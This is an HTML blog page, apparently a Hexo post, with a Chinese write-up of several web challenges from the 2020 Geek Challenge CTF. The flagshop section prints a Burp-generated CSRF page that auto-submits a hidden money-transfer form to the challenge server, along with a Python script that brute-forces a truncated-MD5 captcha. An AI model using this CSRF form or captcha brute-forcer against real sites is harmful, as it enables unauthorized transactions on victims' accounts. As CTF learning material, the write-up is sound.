@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="moMaxX">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="极客大挑战2020年部分wp"/>
+  <meta property="og:description" content="" />
+  <meta property="og:site_name" content="Momax&#39;s blog"/>
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="http://moMaxX.github.io"/>
+  
+    <link rel="alternate" href="/atom.xml" title="Momax&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>Momax's blog</title>
+
+  <!-- Bootstrap CSS -->
+  
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+  <!-- Custom CSS -->
+  
+  
+<link rel="stylesheet" href="/css/style.light.css">
+
+
+  <!-- Google Analytics -->
+  
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+  	<!-- 雪花特效 --> 
+  
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-light.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">极客大挑战2020年部分wp</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/MomaxX" target="_blank" rel="noopener">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:194038819@qq.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By moMaxX</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2020-11-18</span>
+            <span class="time">23:08:36</span>
+          </span>
+          
+        </div>
+        <!-- Tags -->
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>@<a href="2020极客大挑战部分wp">TOC</a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2020极客大挑战开始了。又是一届自闭季。在变菜的路上一去不复返</p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="一、朋友的学妹"><a href="#一、朋友的学妹" class="headerlink" title="一、朋友的学妹"></a>一、朋友的学妹</h2><p>打开题目<img src="https://img-blog.csdnimg.cn/20201030235122118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="题目"><br>发现提示，然后查看控制窗口发现<br><img src="https://img-blog.csdnimg.cn/20201030235235491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="发现"><br>然后看到base64加密，解密后得到flag。</p>
+<h2 id="二、EZWWW"><a href="#二、EZWWW" class="headerlink" title="二、EZWWW"></a>二、EZWWW</h2><p>打开题目<img src="https://img-blog.csdnimg.cn/20201030235410875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="题目"><br>发现提示网站已经备份，那么就直接御剑扫后台得到<br><img src="https://img-blog.csdnimg.cn/20201030235509585.png#pic_center" alt="御剑扫描结果"><br>然后打开zip路径得到下载提示，打开<img src="https://img-blog.csdnimg.cn/2020103023560063.png#pic_center" alt="打开压缩包"><br>直接放弃文档里的flag。肯定假的。所以打开index.php，发现</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;Lola<span class="string">'s website1.0&lt;/title&gt;</span></span><br><span class="line"><span class="string"> &lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string"> &lt;?php echo '</span>&lt;h1&gt;welcome to my website&lt;/h1&gt;<span class="string">'; ?&gt;</span></span><br><span class="line"><span class="string"> &lt;?php echo '</span>&lt;p&gt;i will never forget to backup my website......&lt;/p&gt;<span class="string">'; ?&gt;</span></span><br><span class="line"><span class="string"> &lt;?php echo '</span>&lt;img src=<span class="string">"img/lola.gif"</span> alt=<span class="string">"welcome~"</span>/&gt;<span class="string">'; ?&gt;</span></span><br><span class="line"><span class="string"> &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">$key1 = $_POST['</span>a<span class="string">'];</span></span><br><span class="line"><span class="string">$key2 = base64_decode('</span>c3ljbDB2ZXI=<span class="string">');</span></span><br><span class="line"><span class="string">if($key1 === $key2)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    //this is a true flag</span></span><br><span class="line"><span class="string">echo '</span>&lt;p&gt;SYC&#123;xxxxxxxxxxxxxxxxxx&#125;&lt;/p&gt;<span class="string">';</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现题目源码，然后按照源码意思，进行所给字符串的base64解码，然后<code>post a=解码后的字符</code>。就会得到flag。<img src="https://img-blog.csdnimg.cn/20201030235811365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="flag得到"></p>
+<h2 id="三、刘壮的黑页"><a href="#三、刘壮的黑页" class="headerlink" title="三、刘壮的黑页"></a>三、刘壮的黑页</h2><p>打开题目<br><img src="https://img-blog.csdnimg.cn/20201030235907276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="题目"><br>然后往下翻，发现php代码<br><img src="https://img-blog.csdnimg.cn/20201030235941162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="php源码"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line"><span class="keyword">if</span> ($username === <span class="string">'admin'</span> &amp;&amp; $passwd === <span class="string">'syclover'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以按照代码所说，get、post两个参数进去得到flag。<img src="https://img-blog.csdnimg.cn/20201031000113570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="得到flag"></p>
+<h2 id="四、welcome"><a href="#四、welcome" class="headerlink" title="四、welcome"></a>四、welcome</h2><p>打开题目<br><img src="https://img-blog.csdnimg.cn/20201031000228468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="题目"><br>发现一串空白。然后就随便get了一个东西，但是发现题目提示还有第二种方法，就post了一个。</p>
+<h2 id="五、flagshop"><a href="#五、flagshop" class="headerlink" title="五、flagshop"></a>五、flagshop</h2><p>听题目就是卖flag的了。打开注册进行登录。发现界面如下<br><img src="https://img-blog.csdnimg.cn/20201108193237662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="成功的截图"><br>钱包那里是成功之后的效果。<img src="https://img-blog.csdnimg.cn/2020110819334534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="商品类"><br>当时好奇点了个<strong>今晚去你家吃饭卡</strong>一下子就没钱了，让我本就不富裕的生活更加的雪上加霜。<br>回归正题，在转账界面可以进行转账，然后就试了一下给自己转账<img src="https://img-blog.csdnimg.cn/20201108193542236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="效果"><br>然后感觉就是在留言界面进行操作了。但是具体怎么操作不了解，后来请教了团队大佬，经过他的讲解之后了解了可操作的原理。<br>原理：<code>在报告界面有一个提交报告内容，在这里提交了内容后，后台会进行点击一次的操作，不过经过实验发现是只会点击一次</code>。也就是说，这个题目可以利用<code>CSRF</code>漏洞进行攻击，但是需要自己写一个页面让后台点击，接着会自动跳转到转账页面，让服务器以为是后台转账操作。<br>然后就是强烈介绍我的大表哥–<code>brupsuit</code>了。利用其自带功能，可以编写一个<code>csrf攻击html网页</code><br><img src="https://img-blog.csdnimg.cn/20201108195621730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="抓包"></p>
+<p>抓包页面是这样的，然后就<img src="https://img-blog.csdnimg.cn/20201108195651331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="csrf"><br><img src="https://img-blog.csdnimg.cn/20201108195711825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="页面源码"><br>然后把源码copy一下，在本地创建一个html文档。名字随意。源码如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://173.82.206.142:8005/transfer.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"target"</span> <span class="attr">value</span>=<span class="string">"qwasd"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"money"</span> <span class="attr">value</span>=<span class="string">"1000000000000000000000000000000000000000000000000000000"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"messages"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> <span class="attr">id</span>=<span class="string">"onclick_1"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.getElementById(<span class="string">"onclick_1"</span>).click();</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其中</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">     <span class="built_in">document</span>.getElementById(<span class="string">"onclick_1"</span>).click();</span><br><span class="line">   &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这一段代码用来实现页面进入后自动点击的操作。<br>然后由于是要后台点击你的链接，所以不能放在本地，有条件的哥哥姐姐们可以放在自己的服务器上面，小弟比较菜，就在博客里放了一个链接。也达到了同样的效果。<br>然后就是<img src="https://img-blog.csdnimg.cn/20201108200105832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="提交报告"><br>上面验证码初看一脸懵逼，再看两眼迷离的，所以就问了大佬之后知道了是MD5截断加密。大佬还慷慨的给了我一个脚本用来爆破的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env/python</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> tp</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">knownMd5 = <span class="string">'6fb05'</span>      <span class="comment">#已知的md5明文</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(str(text).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findCode</span><span class="params">(code)</span>:</span></span><br><span class="line">    key = code.split(<span class="string">':'</span>)</span><br><span class="line">    start = int(key[<span class="number">0</span>])</span><br><span class="line">    end = int(key[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> range(start, end):</span><br><span class="line">        <span class="keyword">if</span> md5(code)[<span class="number">0</span>:<span class="number">5</span>] == knownMd5:</span><br><span class="line">            print(code)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">list=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):    <span class="comment">#这里的range(number)指爆破出多少结果停止</span></span><br><span class="line">    list.append(str(<span class="number">10000000</span>*i) + <span class="string">':'</span> + str(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = tp()    <span class="comment">#使用多线程加快爆破速度</span></span><br><span class="line">pool.map(findCode, list)</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>
+<p>然后最后加上自己的链接以及爆破出来的验证码，标题随便写，提交成功就等着转账到账了。<br><img src="https://img-blog.csdnimg.cn/20201108200457570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="效果"><br>之后就是到账，购买flag。</p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+
+<script src="/js/highlight.pack.js"></script>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
